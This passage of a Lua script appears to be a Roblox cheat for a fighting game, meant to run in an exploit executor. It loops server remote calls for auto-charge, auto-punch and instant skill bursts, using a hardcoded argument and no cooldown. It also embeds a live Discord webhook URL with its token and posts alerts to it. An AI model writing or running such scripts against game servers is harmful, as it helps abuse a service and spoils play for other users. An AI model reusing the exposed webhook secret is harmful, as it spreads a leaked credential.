end)






local player = game:GetService("Players").LocalPlayer
local targetted = player.Name
local events = game:GetService("ReplicatedStorage").Package.Events
local datas = game:GetService("ReplicatedStorage").Datas

task.spawn(function()
	while true do
		pcall(function()
			-- ✅ Vérifie d'abord ton toggle
			if savedStates["ChargeAuto"] then
				local targetPlayer = game.Workspace.Living:FindFirstChild(targetted)
				local questData = datas:FindFirstChild(player.UserId)

				if targetPlayer and questData and questData:FindFirstChild("Quest") then
					-- Tant que le joueur est vivant
					while game.Workspace.Living:FindFirstChild(targetted) do
						pcall(function()
							events.cha:InvokeServer("Blacknwhite27")
						end)
						task.wait()
					end
				end
			end
		end)
		task.wait()
	end
end)





local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local placeId = game.PlaceId
local attackArgument = "Blacknwhite27"
local attackCooldown = 0 -- délai entre rafales (secondes)

local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1404159527267467325/bOik9DENiKAzjrpTjtMo0d7ajVWI0cFHeXnYSIxT3l8L6eDAsMqm-RELfL4HWStoso0a"

-- Chemins par placeId
local PlaceConfig = {
    [3311165597] = { path = { "Package", "Events", "letsplayagame" } },
    [5151400895] = { path = { "Package", "Events", "b", "Dece" } }
}

local config = PlaceConfig[placeId]
if not config then
    return warn("Ce script n'est pas prévu pour ce placeId :", placeId)
end

-- Fonction pour trouver un Remote une seule fois
local function getPath(root, parts)
    local current = root
    for _, part in ipairs(parts) do
        current = current:FindFirstChild(part)
        if not current then return nil end
    end
    return current
end

local function safeInvoke(remote, ...)
    if not remote then return false end
    local args = {...}
    return pcall(function()
        if remote:IsA("RemoteFunction") then
            return remote:InvokeServer(table.unpack(args))
        else
            return remote:FireServer(table.unpack(args))
        end
    end)
end

local function sendDiscordAlert(message)
    if not syn or not syn.request then
        warn("syn.request non dispo, pas d'alerte Discord.")
        return
    end
    local payload = {
        content = "@everyone",
        embeds = {{
            title = "⚠️ **ALERTE REMOTE PATH** ⚠️",
            description = message,
            color = 0xFF0000,
            footer = { text = "Auto Attack Script" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    local data = HttpService:JSONEncode(payload)
    pcall(function()
        syn.request({
            Url = DISCORD_WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = data
        })
    end)
end

-- Récupération des remotes au lancement
local attackRemote = getPath(ReplicatedStorage, config.path)
if not attackRemote or not (attackRemote:IsA("RemoteFunction") or attackRemote:IsA("RemoteEvent")) then
    local msg = "Remote introuvable pour le chemin : " .. table.concat(config.path, ".")
    warn(msg)
    sendDiscordAlert(msg)
    return
end

local volleyRemote = getPath(ReplicatedStorage, { "Package", "Events", "voleys" })

-- Liste des skills
local attacks = {
    "Super Dragon Fist", "God Slicer", "Spirit Barrage", "Mach Kick",
    "Wolf Fang Fist", "High Power Rush", "Meteor Strike", "Meteor Charge"
}

-- Trouver boss proche
local function findClosestBoss(playerChar, maxDist)
    if not playerChar then return nil end
    local hrp = playerChar:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    local living = workspace:FindFirstChild("Living")
    if not living then return nil end

    local closest, dist = nil, math.huge
    for _, mob in ipairs(living:GetChildren()) do
        if mob:IsA("Model") and mob:FindFirstChild("Humanoid") and mob:FindFirstChild("HumanoidRootPart") then
            if mob.Humanoid.Health > 0 and mob.Name ~= playerChar.Name then
                local d = (hrp.Position - mob.HumanoidRootPart.Position).Magnitude
                if d < dist then
                    dist = d
                    closest = mob
                end
            end
        end
    end
    if dist <= (maxDist or math.huge) then
        return closest
    end
    return nil
end

-- Boucle principale optimisée
local lastAttack = 0
task.spawn(function()
    while true do
        task.wait(0.05) -- boucle plus rapide

        if not savedStates["AutoNotSafeSkills"] then continue end

        local lplr = Players.LocalPlayer
        if not lplr.Character or not lplr.Character:FindFirstChild("Humanoid") then continue end
        if lplr.Character.Humanoid.Health <= 0 then continue end

        local myData = ReplicatedStorage:FindFirstChild("Datas") and ReplicatedStorage.Datas:FindFirstChild(tostring(lplr.UserId))
        if not myData or myData.Quest.Value == "" then continue end

        for _, player in ipairs(Players:GetPlayers()) do
            local data = ReplicatedStorage.Datas:FindFirstChild(tostring(player.UserId))
            if not data then continue end

            local strong = data:FindFirstChild("Strength") and data.Strength.Value > 400000
            local energy = data:FindFirstChild("Energy") and data.Energy.Value > 400000
            local defense = data:FindFirstChild("Defense") and data.Defense.Value > 400000
            local speed = data:FindFirstChild("Speed") and data.Speed.Value > 400000

            if strong and energy and defense and speed then
                local boss = findClosestBoss(player.Character, 5)
                if boss and tick() - lastAttack >= attackCooldown then
                    lastAttack = tick()

                    -- Rafale instant
                    for _, atk in ipairs(attacks) do
                        safeInvoke(attackRemote, atk, attackArgument)
                    end

                    if volleyRemote then
                        safeInvoke(volleyRemote, "Energy Volley", {
                            FaceMouse = false,
                            MouseHit = CFrame.new()
                        }, attackArgument)
                    end
                end
            end
        end
    end
end)




local player = game.Players.LocalPlayer
local datas = game:GetService("ReplicatedStorage"):WaitForChild("Datas")
local events = game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events")

local function safePunchLoop()
	task.defer(function()
		pcall(function()
			-- ✅ Vérifie d'abord ton toggle
			if savedStates["AutoPunch"] then
				local ldata = datas:FindFirstChild(player.UserId)
				if ldata and ldata:FindFirstChild("Quest") and ldata.Quest.Value ~= "" then
					events.p:FireServer("Blacknwhite27", 1)
				end
			end
		end)

		task.wait()
		safePunchLoop()
	end)
end

safePunchLoop()
